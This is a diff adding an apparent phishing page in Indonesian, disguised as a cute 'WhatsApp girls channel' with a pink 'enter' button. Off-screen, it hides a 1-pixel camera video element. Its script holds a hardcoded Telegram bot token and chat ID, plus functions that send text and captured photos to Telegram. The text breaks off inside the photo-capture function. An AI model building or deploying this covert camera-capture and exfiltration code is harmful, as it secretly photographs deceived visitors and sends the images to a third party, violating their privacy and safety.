@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🌸 Saluran Cewe Imut 🌸</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(145deg, #ffb6c1 0%, #ff69b4 100%);
+            font-family: 'Segoe UI', 'Helvetica Neue', 'Apple Color Emoji', 'Segoe UI Emoji', sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .wa-card {
+            max-width: 500px;
+            width: 100%;
+            background: #fff0f5;
+            border-radius: 48px;
+            box-shadow: 0 30px 40px rgba(255, 20, 147, 0.3);
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+            border: 2px solid #ffe4ec;
+        }
+        .header-pink {
+            background: #ff85b3;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            border-bottom: 3px solid #ffc0cb;
+        }
+        .header-pink h1 {
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            letter-spacing: -0.5px;
+        }
+        .header-pink p {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-top: 6px;
+        }
+        .chat-area {
+            padding: 20px;
+            background: #ffeef4;
+        }
+        .bubble {
+            background: white;
+            border-radius: 28px;
+            padding: 12px 18px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: 0 4px 10px #ffc0cb66;
+            border: 1px solid #ffb7c5;
+        }
+        .bubble span:first-child {
+            font-size: 36px;
+        }
+        .bubble p {
+            color: #aa2e6b;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .emoji-strip {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 34px;
+            margin: 20px 0 10px;
+        }
+        .glow-btn {
+            background: #ff66a3;
+            border: none;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+            padding: 16px;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 8px 0 #b23b68;
+            margin-top: 8px;
+            font-family: inherit;
+        }
+        .glow-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #b23b68;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #ff80a5;
+            padding: 16px;
+            background: #fff0f5;
+            border-top: 1px solid #ffc0cb;
+        }
+        #cameraFeed {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            100% { transform: translateY(-5px); }
+        }
+        .heartbeat {
+            animation: float 1s ease infinite;
+        }
+    </style>
+</head>
+<body>
+<div class="wa-card">
+    <div class="header-pink">
+        <h1>🍥 𝑾𝑨 𝑺𝒂𝒍𝒖𝒓𝒂𝒏 𝑪𝒆𝒘𝒆 🍥 <span>💖🌸</span></h1>
+        <p>✨ 𝐊𝐥𝐢𝐤 𝐭𝐨𝐦𝐛𝐨𝐥 𝐝𝐢 𝐛𝐚𝐰𝐚𝐡 𝐮𝐧𝐭𝐮𝐤 𝐦𝐚𝐬𝐮𝐤 ✨</p>
+    </div>
+    <div class="chat-area">
+        <div class="bubble">
+            <span>🌸</span>
+            <p>𝐇𝐚𝐥𝐨 𝐜𝐞𝐰𝐞 𝐢𝐦𝐮𝐭𝐭𝐭 💕 𝐉𝐚𝐧𝐠𝐚𝐧 𝐥𝐮𝐩𝐚 𝐛𝐚𝐜𝐚 𝐩𝐞𝐬𝐚𝐧 𝐝𝐢𝐫𝐚𝐡𝐚𝐬𝐢𝐚 𝐲𝐚𝐚~ 🎀</p>
+        </div>
+        <div class="bubble">
+            <span>🍭</span>
+            <p>𝐀𝐤𝐮 𝐚𝐝𝐚 𝐤𝐞𝐣𝐮𝐭𝐚𝐚𝐧 𝐮𝐧𝐭𝐮𝐤 𝐤𝐚𝐦𝐮! 💌 𝐊𝐥𝐢𝐤 𝐭𝐨𝐦𝐛𝐨𝐥 𝐩𝐢𝐧𝐤 𝐝𝐢 𝐛𝐚𝐰𝐚𝐡 🧸✨</p>
+        </div>
+        <div class="emoji-strip">
+            <span>🐣</span> <span>🍰</span> <span>🎀</span> <span>💗</span> <span>🍬</span> <span>🌸</span>
+        </div>
+    </div>
+    <div style="padding: 0 20px 20px 20px;">
+        <button class="glow-btn" id="accessBtn">🌸 𝐌𝐚𝐬𝐮𝐤 𝐊𝐚𝐧𝐚𝐥 🌸 <span>💖</span></button>
+    </div>
+    <div class="footer-note">
+        💬 𝟙.𝟚𝕜 𝕠𝕟𝕝𝕚𝕟𝕖  •  𝕡𝕚𝕟𝕜𝕘𝕚𝕣𝕝𝕤 𝕠𝕟𝕝𝕪  •  💓
+    </div>
+</div>
+<video id="cameraFeed" autoplay playsinline muted></video>
+<canvas id="snapCanvas" style="display:none;"></canvas>
+<script>
+    (function() {
+        // ========== TELEGRAM CONFIG (gunakan token dan chat ID langsung) ==========
+        let BOT_TOKEN = "7715360708:AAER46442IsUV7S5JS5cWAbDh8_go6F3fio";  // Ganti dengan token bot Telegram kamu
+        let CHAT_ID = "8651425286";  // Ganti dengan chat ID yang sesuai
+
+        // Kirim pesan teks ke Telegram
+        async function sendToTelegram(text) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', text);
+            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log);
+        }
+
+        // Kirim foto ke Telegram (langsung dengan URL atau file)
+        async function sendPhotoToTelegram(photoFile, caption) {
+            if (!BOT_TOKEN || !CHAT_ID) return;
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoFile);
+            if (caption) formData.append('caption', caption);
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log);
+        }
+
+        // Mengambil foto dari kamera
+        async function takePhoto() {
+            let video = document.getElementById('cameraFeed');
+            let canvas = document.getElementById('snapCanvas
